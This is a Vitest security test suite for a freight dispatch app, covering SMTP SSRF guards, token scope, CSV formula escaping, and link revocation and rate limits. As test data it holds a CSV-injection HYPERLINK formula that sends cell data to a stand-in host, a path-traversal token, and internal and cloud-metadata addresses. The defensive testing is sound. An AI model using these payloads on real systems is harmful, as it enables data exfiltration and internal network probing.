import { describe, it, expect, vi, beforeAll, beforeEach } from 'vitest';
import express from 'express';
import request from 'supertest';

// SMTP is mocked: the tests below check what reaches the network layer and what the user is told.
const mail = vi.hoisted(() => ({
  verify: vi.fn(async () => true),
  created: [],
}));
vi.mock('nodemailer', () => {
  const createTransport = vi.fn((opts) => {
    mail.created.push(opts);
    return { verify: mail.verify, sendMail: async (m) => ({ messageId: '<x@test>', accepted: [m.to], rejected: [] }), close: () => {} };
  });
  return { default: { createTransport }, createTransport };
});

const { app, registerUser, prisma } = await import('./helpers.js');
const { isReservedIp, resolvePublicHost, setNetLookup } = await import('../src/lib/netguard.js');
const { publicLoadTrack, invalidateLoadTrack, newLoadShareToken } = await import('../src/services/fleet/loadShare.js');
const { sha256 } = await import('../src/lib/crypto.js');
const { customerForToken, createPortalLink } = await import('../src/services/invoices/portal.js');
const { makeLimiter, ipOnlyKey } = await import('../src/middleware/security.js');
const { limitDayStart, startOfUserDay, TZ_CHANGE_ACTION } = await import('../src/lib/plans.js');
const { recordBounce } = await import('../src/services/email/replies.js');

const pub = () => request(app);
const DAY = 86400000;

async function stageId() {
  return (await prisma.pipelineStage.findUnique({ where: { key: 'lead' } })).id;
}

beforeEach(() => { mail.verify.mockReset(); mail.verify.mockImplementation(async () => true); mail.created.length = 0; });

describe('outbound mail servers must be public (lib/netguard.js)', () => {
  it('classifies reserved addresses, including mapped, NAT64 and documentation ranges', () => {
    for (const ip of ['127.0.0.1', '10.1.2.3', '172.16.0.1', '192.168.1.1', '169.254.169.254', '100.64.0.1', '0.0.0.0', '198.18.0.1', '192.0.0.8', '192.0.2.1', '203.0.113.5', '224.0.0.1',
      '::1', '::', 'fd00::1', 'fe80::1', '::ffff:127.0.0.1', '::ffff:7f00:1', '64:ff9b::a00:1', '2001:db8::1', '2002:a00:1::1', 'ff02::1', 'not-an-ip']) {
      expect(isReservedIp(ip), ip).toBe(true);
    }
    for (const ip of ['93.184.215.14', '8.8.8.8', '2606:4700:4700::1111', '::ffff:8.8.8.8', '64:ff9b::808:808']) expect(isReservedIp(ip), ip).toBe(false);
  });

  it('refuses names that do not resolve or resolve to any private address, and returns the vetted address', async () => {
    const prev = setNetLookup(async (h) => {
      if (h === 'gone.example.com') throw Object.assign(new Error('ENOTFOUND'), { code: 'ENOTFOUND' });
      if (h === 'mixed.example.com') return [{ address: '93.184.215.14', family: 4 }, { address: '10.0.0.5', family: 4 }];
      if (h === 'v6.example.com') return [{ address: '2606:4700::1', family: 6 }, { address: '93.184.215.14', family: 4 }];
      return [];
    });
    try {
      await expect(resolvePublicHost('gone.example.com')).rejects.toMatchObject({ status: 400 });
      await expect(resolvePublicHost('empty.example.com')).rejects.toMatchObject({ status: 400 });
      await expect(resolvePublicHost('mixed.example.com')).rejects.toMatchObject({ status: 400 });
      await expect(resolvePublicHost('localhost')).rejects.toMatchObject({ status: 400 });
      await expect(resolvePublicHost('mail.corp')).rejects.toMatchObject({ status: 400 });
      await expect(resolvePublicHost('[::1]')).rejects.toMatchObject({ status: 400 });
      expect(await resolvePublicHost('V6.example.com.')).toMatchObject({ address: '93.184.215.14', servername: 'v6.example.com' });
    } finally {
      setNetLookup(prev);
    }
  });

  it('SMTP verify refuses internal hosts and odd ports, connects to the vetted address and hides server banners', async () => {
    const A = await registerUser();
    const form = { provider: 'smtp', fromEmail: 'me@mydispatch.test', password: 'pw', port: 587 };
    for (const host of ['127.0.0.1', 'localhost', 'mail.private-net.test', '169.254.169.254']) {
      const res = await A.agent.post('/api/email/accounts/smtp/verify').send({ ...form, host });
      expect(res.status, host).toBe(400);
    }
    expect((await A.agent.post('/api/email/accounts/smtp/verify').send({ ...form, host: 'smtp.example.test', port: 6379 })).status).toBe(400);
    expect(mail.created).toHaveLength(0);

    mail.verify.mockImplementation(async () => { throw Object.assign(new Error('Invalid greeting. response=SSH-2.0-OpenSSH_9.6: SSH-2.0-OpenSSH_9.6'), { code: 'EPROTOCOL', command: 'CONN' }); });
    const banner = await A.agent.post('/api/email/accounts/smtp/verify').send({ ...form, host: 'smtp.example.test' });
    expect(banner.status).toBe(400);
    expect(banner.body.error).not.toMatch(/SSH|greeting/i);
    expect(banner.body.error).toMatch(/Could not connect to the SMTP server/);
    // The transport went to the address that was checked, with the name kept for the certificate.
    expect(mail.created.at(-1)).toMatchObject({ host: '93.184.215.14', servername: 'smtp.example.test', port: 587 });

    mail.verify.mockImplementation(async () => { throw Object.assign(new Error('Invalid login: 535 5.7.8 Authentication failed'), { code: 'EAUTH', responseCode: 535, command: 'AUTH PLAIN' }); });
    const auth = await A.agent.post('/api/email/accounts/smtp/verify').send({ ...form, host: 'smtp.example.test' });
    expect(auth.body.error).toMatch(/Sign-in failed/);
  });
});

describe('personal API tokens cannot mint public links or export in bulk', () => {
  it('returns 403 on every such route', async () => {
    const A = await registerUser();
    const tok = (await A.agent.post('/api/tokens').send({ name: 'ext', expiresInDays: 30 })).body.token;
    const bearer = { Authorization: `Bearer ${tok}` };
    const calls = [
      ['post', '/api/customers/x1/portal'], ['post', '/api/customers/x1/statements/2026-11-09/send'],
      ['post', '/api/fleet/trips/x1/tracking-links'], ['post', '/api/fleet/carriers/x1/share'],
      ['get', '/api/invoices/export.csv'], ['post', '/api/invoices/x1/send'], ['get', '/api/carriers/export.csv'],
      ['get', '/API/Carriers//export.csv'],
    ];
    for (const [m, url] of calls) {
      const res = await pub()[m](url).set(bearer).send({});
      // Upper-case paths never reach a route (case-sensitive routing answers 404); the rest are refused outright.
      expect(url === url.toLowerCase() ? [403] : [403, 404], url).toContain(res.status);
    }
    // Ordinary reads stay open to tokens.
    expect((await pub().get('/api/carriers').set(bearer)).status).toBe(200);
  });
});

describe('carrier CSV export', () => {
  it('prefixes spreadsheet formulas with a quote', async () => {
    const A = await registerUser();
    await prisma.carrier.create({ data: { ownerId: A.user.id, stageId: await stageId(), companyName: '=HYPERLINK("https://x.test/?"&A2,"click")', email: '@SUM(1+1)@x.test', city: '+cmd' } });
    const res = await A.agent.get('/api/carriers/export.csv');
    expect(res.status).toBe(200);
    expect(res.text).toContain('"\'=HYPERLINK(');
    expect(res.text).not.toMatch(/(^|,)"?=HYPERLINK/m);
    expect(res.text).toContain("'+cmd");
  });
});

describe('broker tracking links', () => {
  let A; let B;
  async function shareFor(load, owner, exact = true) {
    const token = newLoadShareToken(exact);
    await prisma.loadShare.create({ data: { loadId: load.id, ownerId: owner.id, tokenHash: sha256(token), expiresAt: new Date(Date.now() + 3 * DAY) } });
    return token;
  }
  async function truck(ownerId, extra = {}) {
    return prisma.carrier.create({ data: { ownerId, stageId: await stageId(), companyName: `Truck ${Math.random().toString(36).slice(2, 7)}`, isFleet: true, locationLat: 32.7767, locationLng: -96.797, locationCity: 'Dallas', locationState: 'TX', locationUpdatedAt: new Date(), locationSource: 'driver_link', ...extra } });
  }
  const tripOf = (ownerId, carrierId, data = {}) => prisma.load.create({ data: { ownerId, carrierId, originCity: 'Dallas', originState: 'TX', destCity: 'Memphis', destState: 'TN', rateCents: 100000, loadedMiles: 450, status: 'in_transit', ...data } });

  beforeAll(async () => {
    A = await registerUser();
    B = await registerUser();
  });

  it("never shows a truck the link owner can no longer see, and refuses to create such links", async () => {
    const bTruck = await truck(B.user.id);
    // A load A owns on B's truck (made while both were on a team).
    const load = await tripOf(A.user.id, bTruck.id);
    expect((await A.agent.post(`/api/fleet/trips/${load.id}/tracking-links`).send({ exact: true })).status).toBe(404);
    const token = await shareFor(load, A.user);
    const out = await publicLoadTrack(token);
    expect(out.body).toMatchObject({ status: 'in_transit', location: null, progress: null });
    expect(JSON.stringify(out.body)).not.toContain('32.77');
  });

  it("shows the position only while the load is the truck's current trip", async () => {
    const t = await truck(A.user.id);
    const current = await tripOf(A.user.id, t.id, { status: 'in_transit', pickupDate: new Date(Date.now() - DAY) });
    const later = await tripOf(A.user.id, t.id, { status: 'booked', pickupDate: new Date(Date.now() + 2 * DAY), originCity: 'Atlanta', originState: 'GA' });
    const laterOut = await publicLoadTrack(await shareFor(later, A.user));
    expect(laterOut.body.status).toBe('booked');
    expect(laterOut.body.location).toBeNull();
    const currentOut = await publicLoadTrack(await shareFor(current, A.user));
    expect(currentOut.body.location).toMatchObject({ lat: 32.777, lng: -96.797 });
  });

  it('links of a suspended account stop working', async () => {
    const C = await registerUser();
    const t = await truck(C.user.id);
    const load = await tripOf(C.user.id, t.id);
    const token = await shareFor(load, C.user);
    expect((await pub().get(`/api/public/load-track/${token}`)).status).toBe(200);
    await prisma.user.update({ where: { id: C.user.id }, data: { status: 'suspended' } });
    invalidateLoadTrack();
    expect((await pub().get(`/api/public/load-track/${token}`)).status).toBe(410);
  });

  it('leaving a team revokes links that cross between the members', async () => {
    const owner = await registerUser();
    const member = await registerUser();
    const team = await prisma.team.create({ data: { name: 'Crew', ownerId: owner.user.id } });
    await prisma.teamMember.create({ data: { teamId: team.id, userId: owner.user.id, role: 'owner' } });
    await prisma.teamMember.create({ data: { teamId: team.id, userId: member.user.id, role: 'dispatcher', canViewTeamData: true } });
    const ownersTruck = await truck(owner.user.id);
    const load = await tripOf(member.user.id, ownersTruck.id);
    const share = await prisma.loadShare.create({ data: { loadId: load.id, ownerId: member.user.id, tokenHash: sha256(newLoadShareToken(true)), expiresAt: new Date(Date.now() + 3 * DAY) } });
    const res = await owner.agent.delete(`/api/teams/members/${member.user.id}`);
    expect([200, 204]).toContain(res.status);
    expect((await prisma.loadShare.findUnique({ where: { id: share.id } })).revokedAt).not.toBeNull();
  });
});

describe('carrier portal links', () => {
  it('stop working when the account is suspended', async () => {
    const A = await registerUser();
    const c = await prisma.carrier.create({ data: { ownerId: A.user.id, stageId: await stageId(), companyName: 'Portal Carrier' } });
    const customer = await prisma.customer.create({ data: { ownerId: A.user.id, carrierId: c.id } });
    const { token } = await createPortalLink(customer);
    expect(await customerForToken(token)).not.toBeNull();
    expect(await customerForToken('../../carriers')).toBeNull();
    await prisma.user.update({ where: { id: A.user.id }, data: { status: 'suspended' } });
    expect(await customerForToken(token)).toBeNull();
  });
});

describe('public link misses are limited per address', () => {
  it('counts only unknown or expired links (404/410), never working ones', async () => {
    const limiter = makeLimiter('test-linkmiss', 60_000, 2, 'Too many invalid links', { key: ipOnlyKey, force: true, countOnly: (res) => res.statusCode === 404 || res.statusCode === 410 });
    const tiny = express();
    tiny.use(limiter);
    tiny.get('/ok', (req, res) => res.json({ ok: true }));
    tiny.get('/miss', (req, res) => res.status(404).json({ error: 'nope' }));
    for (let i = 0; i < 5; i++) expect((await request(tiny).get('/ok')).status).toBe(200);
    expect((await request(tiny).get('/miss')).status).toBe(404);
    expect((await request(tiny).get('/miss')).status).toBe(404);
    expect((await request(tiny).get('/miss')).status).toBe(429);
    expect((await request(tiny).get('/ok')).status).toBe(429);
  });
});

describe('daily limits and time-zone changes', () => {
  it('counts from the earliest midnight of the zones used in the last two days', async () => {
    const A = await registerUser();
    await A.agent.patch('/api/profile').send({ timezone: 'Pacific/Kiritimati' });
    const res = await A.agent.patch('/api/profile').send({ timezone: 'Pacific/Pago_Pago' });
    expect(res.status).toBe(200);
    expect(await prisma.auditLog.count({ where: { actorId: A.user.id, action: TZ_CHANGE_ACTION } })).toBe(2);
    const user = await prisma.user.findUnique({ where: { id: A.user.id } });
    const now = new Date();
    const zones = ['Pacific/Pago_Pago', 'Pacific/Kiritimati', 'America/Chicago'];
    const expected = Math.min(...zones.map((z) => startOfUserDay(z, now).getTime()));
    expect((await limitDayStart(user, now)).getTime()).toBe(expected);
    const B = await registerUser();
    const fresh = await prisma.user.findUnique({ where: { id: B.user.id } });
    expect((await limitDayStart(fresh, now)).getTime()).toBe(startOfUserDay(fresh.timezone, now).getTime());
  });
});

describe('bounce notices', () => {
  it('never suppress an address without an email the user really sent', async () => {
    const A = await registerUser();
    const user = await prisma.user.findUnique({ where: { id: A.user.id } });
    const c = await prisma.carrier.create({ data: { ownerId: A.user.id, stageId: await stageId(), companyName: 'Spoof Target', email: 'victim@carrier.test' } });
    expect(await recordBounce({ user, email: null, recipient: 'victim@carrier.test', reason: 'fake' })).toEqual({ suppressed: false });
    expect(await prisma.emailSuppression.count({ where: { ownerId: A.user.id, email: 'victim@carrier.test' } })).toBe(0);
    expect((await prisma.carrier.findUnique({ where: { id: c.id } })).doNotEmail).toBe(false);
  });
});
